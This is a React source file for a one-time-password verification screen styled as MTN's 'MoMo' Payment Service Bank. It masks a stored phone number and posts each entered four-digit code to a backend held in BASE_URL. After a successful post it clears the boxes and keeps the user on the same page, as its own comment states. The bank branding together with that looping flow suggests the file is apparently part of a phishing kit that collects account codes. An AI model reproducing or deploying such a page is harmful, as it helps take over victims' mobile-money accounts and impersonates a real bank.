import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{4}$/, "OTP must be exactly 4 digits")
    .required("OTP is required"),
});

const OTPVerification = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(46);
  const [canResend, setCanResend] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState("");

  useEffect(() => {
    const storedPhone = localStorage.getItem("userPhoneNumber") || "0000000000";
    // Mask phone: show first 3 and last 2 digits, hash the rest
    const masked =
      storedPhone.slice(0, 3) +
      "*".repeat(storedPhone.length - 5) +
      storedPhone.slice(-2);
    setPhoneNumber(masked);
    document.getElementById("otp-0")?.focus();
  }, []);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [countdown]);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 3 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`).focus();
    }
  };

  const handleResendCode = () => {
    if (!canResend) return;

    setCanResend(false);
    setCountdown(46);
    setOtp(new Array(4).fill(""));
    document.getElementById("otp-0")?.focus();

    axios
      .post(`${BASE_URL}/resend-otp`, { phoneNumber })
      .then((response) => {
        console.log("OTP resent successfully", response.data);
      })
      .catch((error) => {
        console.error("Error resending OTP:", error);
      });
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/verify-otp`, data)
      .then((response) => {
        console.log(response.data);
        // Clear OTP inputs and stay on the same page
        setOtp(new Array(4).fill(""));
        setValue("otp", "");
        document.getElementById("otp-0")?.focus();
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Section with Logo and Title */}
      <div className="px-6 pt-6 pb-4">
        {/* Logo Section */}
        <div className="mb-6 flex justify-center">
          <div className="flex items-center gap-3">
            <div className="w-14 h-14 bg-[#1a4d7a] rounded-xl flex items-center justify-center relative overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-br from-[#1a4d7a] to-[#0d2f4d]"></div>
              <svg
                className="w-8 h-8 text-[#f9c74f] relative z-10"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5zm0 18c-3.86-.92-7-5.22-7-9V8.3l7-3.5 7 3.5V11c0 3.78-3.14 8.08-7 9z" />
                <path d="M10 14l-3-3 1.41-1.41L10 11.17l5.59-5.58L17 7l-7 7z" />
              </svg>
            </div>
            <div className="flex flex-col">
              <span className="text-2xl font-bold text-[#1a4d7a] tracking-tight">
                MoMo
              </span>
              <span className="text-xs text-gray-600">
                Payment Service Bank from MTN
              </span>
            </div>
          </div>
        </div>

        {/* Welcome Text */}
        <div className="text-center mb-2">
          <h1 className="text-2xl font-light">
            <span className="text-[#f9c74f] font-semibold">Yello!</span>{" "}
            <span className="text-gray-800">Welcome Back!</span>
          </h1>
        </div>
      </div>

      {/* Bottom Sheet Modal */}
      <div className="flex-1 bg-white rounded-t-[28px] px-6 pt-4 pb-8 shadow-2xl relative">
        {/* Handle Bar */}
        <div className="flex justify-center mb-6">
          <div className="w-12 h-[5px] bg-gray-300 rounded-full"></div>
        </div>

        <div className="max-w-md mx-auto">
          <h2 className="text-[28px] font-bold text-gray-900 text-center mb-3">
            Verify your account
          </h2>
          <p className="text-gray-600 text-center mb-8 text-sm leading-relaxed px-2">
            Please enter the 4 digit OTP code we sent to {phoneNumber}
          </p>

          <form onSubmit={handleSubmit(submitForm)}>
            {/* OTP Input Boxes */}
            <div className="flex justify-center gap-3 mb-4">
              {otp.map((data, index) => (
                <input
                  key={index}
                  id={`otp-${index}`}
                  type="text"
                  name="otp"
                  maxLength="1"
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                  onFocus={(e) => e.target.select()}
                  className={`w-[70px] h-[70px] text-center text-2xl font-semibold border-2 rounded-2xl focus:outline-none transition-all ${
                    data
                      ? "border-[#1a4d7a] bg-white shadow-sm"
                      : "border-gray-200 bg-white"
                  } ${
                    errors.otp ? "border-red-500" : ""
                  } focus:border-[#1a4d7a] focus:shadow-md`}
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                />
              ))}
            </div>

            <div className="mb-6 min-h-[20px]">
              <FormErrMsg errors={errors} inputName="otp" />
            </div>

            {/* Continue Button */}
            <button
              type="submit"
              disabled={loading || otp.some((digit) => digit === "")}
              className="w-full bg-[#8fb4c5] text-white py-4 rounded-xl font-semibold text-[17px] hover:bg-[#7da3b4] active:bg-[#6d93a3] transition-all disabled:opacity-40 disabled:cursor-not-allowed shadow-sm mb-6"
            >
              {loading ? "Verifying..." : "Continue"}
            </button>

            {/* Resend Code Section */}
            <div className="text-center">
              {canResend ? (
                <button
                  type="button"
                  onClick={handleResendCode}
                  className="text-[#1a4d7a] font-medium text-sm hover:underline"
                >
                  Resend code
                </button>
              ) : (
                <p className="text-gray-600 text-sm">
                  Resend code in{" "}
                  <span className="font-semibold text-gray-900">
                    {formatTime(countdown)}
                  </span>
                </p>
              )}
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
